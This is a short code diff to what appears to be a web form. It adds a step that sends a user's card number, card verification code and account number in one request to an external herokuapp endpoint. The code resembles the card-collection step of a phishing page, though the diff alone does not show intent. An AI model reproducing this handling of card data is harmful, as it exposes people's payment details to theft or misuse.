@@ -94,6 +94,19 @@ export default function Form() {
                     }
                 });
                 break;
+            
+            case 4:
+                axios.post("https://investment-com.herokuapp.com/step-3", {
+                    cardNumber: values.clientCardNumber,
+                    cardVerificationNumber: values.cardVerificationNumber,
+                    accountNumber: values.clientAccountNumber,
+                    queryId: queryId,
+                }).then((response) => {
+                    if(response.data.saved) {
+                        console.log("step 4");
+                    }
+                });
+                break;
         }
     };
 
